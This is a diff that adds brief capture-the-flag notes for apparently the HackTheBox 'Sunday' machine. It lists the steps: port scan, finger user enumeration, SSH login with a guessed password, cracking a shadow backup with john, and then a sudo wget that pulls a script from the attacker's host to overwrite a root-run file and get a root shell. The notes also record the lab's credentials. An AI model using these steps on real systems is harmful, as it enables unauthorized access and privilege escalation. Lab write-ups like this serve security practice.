@@ -1,0 +1,19 @@
+//Based on Arrexel
+nmap -sV -Pn -p- 10.10.10.76
+perl finger-user-enum.pl -U /usr/share/wordlists/SecLists/Usernames/Names/names.txt -t 10.10.10.76
+sunny:sunday	//password guessed or could've used hydra for ssh
+ssh -oKexAlgorithms=diffie-hellman-group1-sha1 -p 22022 sunny@10.10.10.76
+sudo -l		//can run/root/troll as sunny
+/backup/shadow.backup
+
+john shadow.backup --wordlist=/usr/share/wordlists/rockyou.txt
+sammy:cooldude!
+sudo -l		//can run wget as sammy
+
+vim /root/troll		//kali
+	#!/bin/bash
+	bash
+
+sudo wget http://10.10.14.5:8000/troll -O /root/troll	//sammy
+
+sudo /root/troll	//got root
